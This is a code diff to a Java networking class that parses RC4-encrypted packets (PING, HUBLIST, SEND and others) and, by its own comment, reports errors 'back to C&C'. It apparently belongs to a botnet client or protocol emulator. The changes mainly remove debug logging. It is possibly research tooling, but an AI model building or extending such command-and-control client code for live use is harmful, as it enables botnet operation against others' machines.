@@ -143,7 +143,6 @@ public class Link extends TCPSocket {
         
         // Decrypt if the stream was set up already
         if (status == LinkStatus.ONLINE) {
-        	LOGGER.info(" [!] Received data, decrypting!");
             receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
             readBuffer.clear();
         }
@@ -369,7 +368,6 @@ public class Link extends TCPSocket {
     }
 
     private void sendPong() {
-    	LOGGER.info(" [*] Sending pong packet.");
         Packet pongPacket = new Packet();
         
         pongPacket.tag = "PONG";
@@ -378,22 +376,14 @@ public class Link extends TCPSocket {
     }
 
     public void parseCommand() {
-    	LOGGER.info(" [+] Attempting to parse packet");
-
-    	LOGGER.info("Received data dump; ");
-    	LOGGER.info(Hex.toHexString(receiveBuffer.array()));
-        	
         Packet packet = null;
         while((packet = Packet.unpack(receiveBuffer)) != null) {
             if (packet.tag.equals("PING")) {
-            	LOGGER.info(" [*] Parsed ping packet");
                 sendPong();
             }else if (packet.tag.equals("HUBLIST")) {
-            	LOGGER.info(" [*] Parsing a new hub list packet!");
                 owner.hubList.loadFromPacket(packet);
                 owner.saveHubList();
             }else if (packet.tag.equals("UDPHUBLIST")) {
-            	LOGGER.info(" [*] Parsing a new UDP hub list packet!");
                 owner.udpList.loadFromPacket(packet);
                 owner.saveUDPHubList();
             }else if (packet.tag.equals("SETGROUP")) {
@@ -424,13 +414,20 @@ public class Link extends TCPSocket {
                 recvSHUT(packet);
             }else if (packet.tag.equals("SEND")) {
                 recvSEND(packet);
-            }else { 
+            }else {
             	LOGGER.warning(" [!] Unknown packet hit using tag : [ " + packet.tag + " ]");
+            	LOGGER.info("Received data dump; ");
+            	LOGGER.info(Hex.toHexString(receiveBuffer.array()));
             }
         }
     }
 
 
+    /**
+     * Send an error packet about the ProxyLink back to C&C
+     * @param num Error number
+     * @param ch Channel which contained the error
+     */
     public void sendError(int num, int ch) {
     	LOGGER.warning(" [*] Sending error packet.");
     	Packet errorPacket = new Packet();
@@ -448,7 +445,6 @@ public class Link extends TCPSocket {
     }
 
     public void sendGetHubList() {
-    	LOGGER.info(" [*] Sending get hub list packet.");
     	Packet getHubListPacket = new Packet();
     	
         getHubListPacket.tag = "GETHUBLIST";
@@ -471,7 +467,6 @@ public class Link extends TCPSocket {
      */
     public void sendEncrypt(byte[] data) {
         if (isConnected()) {
-        	LOGGER.info(" [+] Sending " + data.length + " bytes of data after encrypting...");
         	try {
                 send(rc4Outstream.crypt(data));
             } catch (IOException e) {
